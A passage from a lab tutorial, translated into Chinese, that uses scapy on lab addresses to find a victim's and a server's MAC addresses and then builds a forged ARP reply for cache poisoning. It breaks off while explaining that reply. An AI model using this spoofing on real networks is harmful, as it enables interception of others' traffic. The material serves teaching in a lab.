    `>>> server_ip = "172.20.0.5"` `>>> victim_ip = "172.20.0.6"`


    ① IPv4 地址在 scapy 中是字符串


    现在让我们看看 scapy 如何允许我们构建数据包。我们将构建一个以太网帧，其中包含一个 IP 数据包，其中包含一个 ICMP 回显请求，数据设置为我们的姓名：


    ## Listing 6. attacker


    ```

    >>> ping = Ether()/IP(dst=server_ip)/ICMP()/"Ryan Tolboom" ① >>> ping.show() ②
    ###[ Ethernet ]### dst = 02:42:ac:14:00:05 src = 02:42:ac:14:00:07 type = IPv4
    ###[ IP ]### version = 4 ihl = None tos = 0x0 len = None id = 1 flags = frag =
    0 ttl = 64 proto = icmp chksum = None src = 172.20.0.7 dst = 172.20.0.5 \options
    \ ###[ ICMP ]### type = echo-request code = 0 chksum = None id = 0x0 seq = 0x0
    unused = '''' ###[ Raw ]### load = ''Ryan Tolboom'' >>> result = srp1(ping) ③
    Begin emission: Finished sending 1 packets. .* Received 2 packets, got 1 answers,
    remaining 0 packets >>> result.show() ###[ Ethernet ]### dst = 02:42:ac:14:00:07
    src = 02:42:ac:14:00:05 type = IPv4 ###[ IP ]### version = 4 ihl = 5 tos = 0x0
    len = 40 id = 62086 flags = frag = 0 ttl = 64 proto = icmp chksum = 0x301a src
    = 172.20.0.5 dst = 172.20.0.7 \options \ ###[ ICMP ]### type = echo-reply code
    = 0 chksum = 0xea7a id = 0x0 seq = 0x0 unused = '''' ###[ Raw ]### load = ''Ryan
    Tolboom'' >>> server_mac = result[0][0].src >>> server_mac ''02:42:ac:14:00:05''

    ```


    ① Scapy 使用 `/` 运算符来嵌套协议。这是我的姓名，封装在 ICMP 数据包中，再封装在 IP 数据包中，最后封装在以太网帧中。请务必使用你自己的姓名！

    ② `show()` 命令以详细信息打印数据包

    ③ `srp1()` 函数在第二层发送和接收 *一个* 数据包


    注意我们如何使用此方法来捕获服务器的 MAC 地址并将其保存在 `server_mac` 变量中。


    我们还可以使用 ARP "who-has" 请求在第二层确定 MAC 地址。让我们构建并发送一个带有 ARP "who-has" 请求的广播以太网帧，目标是受害者的
    IP 地址。结果将告诉我们受害者的 MAC 地址是什么：


    ## Listing 7. attacker


    ```

    >>> whohas = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=victim_ip) >>> result = srp1(whohas)
    Begin emission: Finished sending 1 packets. * Received 1 packets, got 1 answers,
    remaining 0 packets >>> result.show() ###[ Ethernet ]### dst = 02:42:ac:14:00:07
    src = 02:42:ac:14:00:06 ① type = ARP ###[ ARP ]### hwtype = 0x1 ptype = IPv4 hwlen
    = 6 plen = 4 op = is-at hwsrc = 02:42:ac:14:00:06 psrc = 172.20.0.6 hwdst = 02:42:ac:14:00:07
    pdst = 172.20.0.7 >>> victim_mac = result[0].src

    ```


    ① 这是受害者的我的 MAC 地址，但你的可能不同！


    ARP 交互的工作方式应该是这样的。我们广播询问应该为某个 IP 使用什么 MAC，然后会收到来自 *合法拥有该 MAC 和 IP 的人* 的响应。


    我们拥有创建 ARP 数据包所需的一切，告诉受害者当他们尝试访问服务器 IP 时，将流量发送给我们：


    ## Listing 8. attacker


    ```

    >>> victim_ip, victim_mac, server_ip, server_mac (''172.20.0.6'', ''02:42:ac:14:00:06'',
    ''172.20.0.5'', ''02:42:ac:14:00:05'')

    ```


    现在让我们创建并查看一个恶意 ARP 数据包：


    ## Listing 9. attacker


    ```

    >>> bad_arp = ARP(op=2, pdst=victim_ip, psrc=server_ip, hwdst=victim_mac) >>>
    bad_arp <ARP op=is-at psrc=172.20.0.5 hwdst=02:42:ac:14:00:06 pdst=172.20.0.6
    |>

    ```


    这个数据包伪装成来自服务器，它在 IP 和 MAC 上都指向受害者，但用于发送它的 MAC 地址是我们的（默认情况下，我们不指定 `hwsrc`）。这意味着受害者将更新其
